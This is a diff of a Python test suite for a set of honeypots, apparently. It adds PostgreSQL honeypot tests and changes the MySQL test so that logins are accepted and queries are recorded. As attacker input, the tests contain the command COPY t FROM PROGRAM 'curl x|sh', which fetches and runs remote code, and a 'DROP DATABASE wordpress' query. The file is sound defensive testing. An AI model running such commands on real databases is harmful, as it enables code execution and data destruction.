@@ -9,6 +9,7 @@ import unittest
 
 import honeypot_ftp
 import honeypot_mysql
+import honeypot_postgres
 import honeypot_ssh
 import honeypot_telnet
 import fakeshell
@@ -193,19 +194,56 @@ class MySQLHoneypotTests(HoneypotBase):
         self.assertIn(b"MariaDB", greeting)
         return sock
 
-    def test_login_is_recorded_and_denied(self):
+    def test_login_is_accepted_and_queries_recorded(self):
         login = (struct.pack("<I", 0x0008A20F) + struct.pack("<I", 1 << 24) + b"\x21" + b"\0" * 23
                  + b"root\0" + bytes([20]) + b"x" * 20 + b"wordpress\0" + b"mysql_native_password\0")
         with self.connect() as sock:
             sock.sendall(honeypot_mysql.packet(1, login))
             seq, reply = honeypot_mysql._read_packet(sock)
-        self.assertEqual((seq, reply[:1], reply[3:9]), (2, b"\xff", b"#28000"))
-        self.assertEqual(self.wait_events(1), [("MySQL-Probe", "high", "Login-Versuch als „root“ · DB „wordpress“")])
+            self.assertEqual((seq, reply[:1]), (2, b"\x00"))
+            sock.sendall(honeypot_mysql.packet(0, b"\x03show databases"))
+            replies = [honeypot_mysql._read_packet(sock)[1] for _ in range(8)]  # Anzahl, Spalte, EOF, 4 Zeilen, EOF
+            self.assertIn(b"wordpress", replies[6])
+            sock.sendall(honeypot_mysql.packet(0, b"\x03DROP DATABASE wordpress"))
+            self.assertEqual(honeypot_mysql._read_packet(sock)[1][:1], b"\x00")
+        rows = self.wait_events(3)
+        self.assertEqual(rows[0], ("MySQL-Probe", "high", "Login-Versuch als „root“ · DB „wordpress“"))
+        self.assertEqual([r[2] for r in rows[1:]], ["Befehl „show databases“", "Befehl „DROP DATABASE wordpress“"])
         self.assertEqual(stats.compute(self.store, "24h")["usersTop"][0]["user"], "root")
 
     def test_scan_without_login(self):
         self.connect().close()
         self.assertEqual(self.wait_events(1)[0][1:], ("low", "Verbindung ohne Login (Server-Erkennung)"))
+
+
+class PostgresHoneypotTests(HoneypotBase):
+    def setUp(self):
+        self.start(honeypot_postgres.PostgresHoneypot(Store(":memory:"), port=0, host="127.0.0.1"))
+
+    def read(self, sock):
+        kind, length = struct.unpack("!cI", honeypot_postgres._read(sock, 5))
+        return kind, honeypot_postgres._read(sock, length - 4)
+
+    def test_cleartext_login_and_copy_program_recorded(self):
+        with socket.create_connection(("127.0.0.1", self.pot.port), timeout=5) as sock:
+            sock.sendall(struct.pack("!II", 8, honeypot_postgres.SSL_REQUEST))
+            self.assertEqual(sock.recv(1), b"N")
+            params = b"user\0postgres\0database\0postgres\0\0"
+            sock.sendall(struct.pack("!II", 8 + len(params), honeypot_postgres.PROTOCOL_3) + params)
+            self.assertEqual(self.read(sock), (b"R", struct.pack("!I", 3)))
+            sock.sendall(honeypot_postgres.message(b"p", b"geheim123\0"))
+            kinds = []
+            while not kinds or kinds[-1] != b"Z":
+                kinds.append(self.read(sock)[0])
+            self.assertEqual((kinds[0], kinds[-2]), (b"R", b"K"))
+            sock.sendall(honeypot_postgres.message(b"Q", b"COPY t FROM PROGRAM 'curl x|sh'\0"))
+            self.assertEqual(self.read(sock), (b"C", b"COPY 0\0"))
+        rows = self.wait_events(2)
+        self.assertEqual(rows[0], ("Postgres-Probe", "high", "Login-Versuch als „postgres“ · Passwort „geheim123“"))
+        self.assertEqual(rows[1], ("Postgres-Probe", "crit", "Befehl „COPY t FROM PROGRAM 'curl x|sh'“"))
+        top = stats.compute(self.store, "24h")
+        self.assertEqual((top["passwordsTop"][0]["password"], top["commandsTop"][0]["command"]),
+                         ("geheim123", "COPY t FROM PROGRAM 'curl x|sh'"))
 
 
 class FTPHoneypotTests(HoneypotBase):
